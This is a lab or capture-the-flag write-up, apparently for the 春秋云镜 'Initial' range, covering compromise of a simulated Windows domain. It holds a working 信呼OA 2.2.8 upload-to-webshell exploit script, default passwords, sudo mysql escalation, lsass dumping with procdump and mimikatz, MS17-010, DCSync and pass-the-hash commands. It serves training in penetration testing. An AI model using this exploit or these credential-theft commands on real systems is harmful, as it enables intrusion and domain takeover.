# 春秋云镜-Initial

```
靶机信息
互联网侧：39.991.149.94
  内网侧:172.22.1.2   （域控-XIAORANG)
        172.22.1.21  （域内-ms17-010）
        172.22.1.18  （域内-信呼OA)
        172.22.1.15  （域外-入口的thinkphp）
```

## 一、外网打点

访问靶机80端口发现web服务

![image-20231112201543560](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112201543560.png)

使用Ehole指纹识别工具（魔改版）识别出存在php框架,并存在thinkphp远程代码执行漏洞

![image-20231112201720803](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112201720803.png)

使用thinkphp利用工具getshell，无法执行命令，直接上传哥斯拉木马

![image-20231112202242565](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112202242565.png)

查看权限只有www网站权限

![image-20231112202424162](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112202424162.png)

上传自动化提权脚本：https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

![image-20231112202613051](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112202613051.png)

./LinEnum.sh > 1.txt 执行，观察发现可以使用mysql提权

![image-20231112203402044](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112203402044.png)

尝试使用sudo -l 执行提权，也提示mysql密码为空

![image-20231112203225418](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112203225418.png)

![image-20231112203653551](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112203653551.png)

> mysql提权命令
>
> sudo mysql -e '\! whoami'
>
> sudo mysql -e '\! ls /root'
>
> sudo mysql -e '\! ls /root/flag'
>
> sudo mysql -e '\! cat /root/flag/flag01.txt'

flag01: flag{60b53231-

## 二、内网探测

查看ip信息为172.22.1.15

![image-20231112203759257](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112203759257.png)

使用App扫描内网

```
./App-amd64linux-noupx -i 172.22.1.0/24 -o 172_22_1.txt
```

![image-20231112204110365](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112204110365.png)

使用neoreg搭建正向代理进入内网

![image-20231112204504373](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112204504373.png)

![image-20231112204553728](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112204553728.png)



三、信呼OA后台默认口令Getshell

![image-20231112205146171](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112205146171.png)

```
信呼OA默认口令
admin/123456 #测试时默认口令被修改为弱口令admin/admin123
zhangfei/123456
```

根据扫描器结果，使用zhangfei/123456登录信呼OA，登录后显示OA版本为2.2.8

![image-20231112205201740](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112205201740.png)

信呼OA后台getshell，使用用户zhangfei/123456上传webshell

```python
import requests

session = requests.session()
url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'
data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'emhhbmdmZWk=',
    'adminpass': 'MTIzNDU2',
    'yanzm': ''    
}

r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})

filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'

id = r.json()['id']

print(filepath)

url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
r = session.get(url3)

r = session.get(url_pre + filepath + "?1=system('dir');")

print(r.text)

```

webshel连接地址：http://172.22.1.18/upload/2023-11/12_21035279.php

![image-20231112210514680](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112210514680.png)

![image-20231112210619613](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112210619613.png)

![image-20231112210742893](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112210742893.png)

flag02: 2ce3-4813-87d4-

添加用户加入管理员组rdp远程桌面

adminlstrator/123.com.123

![image-20231112211238733](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112211238733.png)

![image-20231112211552284](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112211552284.png)

```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

![image-20231112211643712](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112211643712.png)

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpa
sswords" "exit"> pssword.txt #获取域管理员hash
```

未成功获取域管hash

## 四、MS17010+DCSync获取域管hash横向域控

使用ms17-010攻击域内主机172.22.1.21

![image-20231112220709443](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112220709443.png)

尝试抓取密码和hash

![image-20231112220959505](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112220959505.png)

获取域控名称

![image-20231112221542735](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112221542735.png)

dump所有用户hash

```
kiwi_cmd lsadump::dcsync /all /csv
```

![image-20231112221839590](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112221839590.png)

500     Administrator   10cf89a850fb1cdbe6bb432b859164c8    

利用wmiexec.py横向域控获取flag03

```
python3 wmiexec.py -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang/administrator@172.22.1.2 "type Users\Administrator\flag\flag03.txt"
```

![image-20231112225332605](%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial.assets/image-20231112225332605.png)

```
flag03: e8f88d0d43d6}
```

flag: flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}



